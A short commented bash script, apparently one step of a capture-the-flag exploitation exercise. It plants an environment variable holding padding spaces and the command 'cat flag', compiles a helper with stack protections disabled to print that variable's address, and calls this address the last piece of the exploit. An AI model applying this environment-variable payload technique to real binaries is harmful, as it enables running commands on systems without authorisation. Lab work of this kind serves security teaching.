#!/bin/bash

#save a global variable EGG
#NB. the spaces are required and must be a lot, otherwise it won't work
export EGG='                                                              
                                                                          
cat flag'

#enter in writable folder
cd writable/

#create a file that print the address where the EGG variable can be found
nano egg.c

#compile egg.c file
gcc -m32 -fno-pie -z execstack -o egg egg.c

#execute egg file, save the printed address because it is the last element
#required for the exploit
./egg
